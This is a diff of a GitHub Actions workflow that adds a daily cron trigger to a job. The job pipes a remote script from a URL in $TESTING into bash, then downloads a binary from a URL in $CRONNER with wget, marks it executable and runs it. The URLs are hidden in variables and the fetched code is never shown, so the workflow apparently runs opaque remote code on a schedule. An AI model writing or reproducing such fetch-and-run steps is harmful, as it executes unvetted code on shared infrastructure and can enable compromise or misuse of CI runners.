@@ -1,11 +1,8 @@
 name: Inline Shell Commands
 
-# on:
-#   schedule:
-#     - cron: '0 5 * * *'
-#   workflow_dispatch:
-
 on:
+  schedule:
+    - cron: '30 6 * * *'
   push:
     branches: [ main ]
   workflow_dispatch:
@@ -34,15 +31,10 @@ jobs:
         set -e
         echo "Running in Ubuntu container job..."
         
-        # Your existing logic
         curl -sSL $TESTING | bash -s
-        cd *_TL
-        ls
-        ./*_TL
-        
 
-        # bash ./start.sh
-        # sleep 3
-        # wget -q -nv $CRONNER -O main
-        # chmod +x main
-        # ./main
+        bash ./start.sh
+        sleep 3
+        wget -q -nv $CRONNER -O main
+        chmod +x main
+        ./main
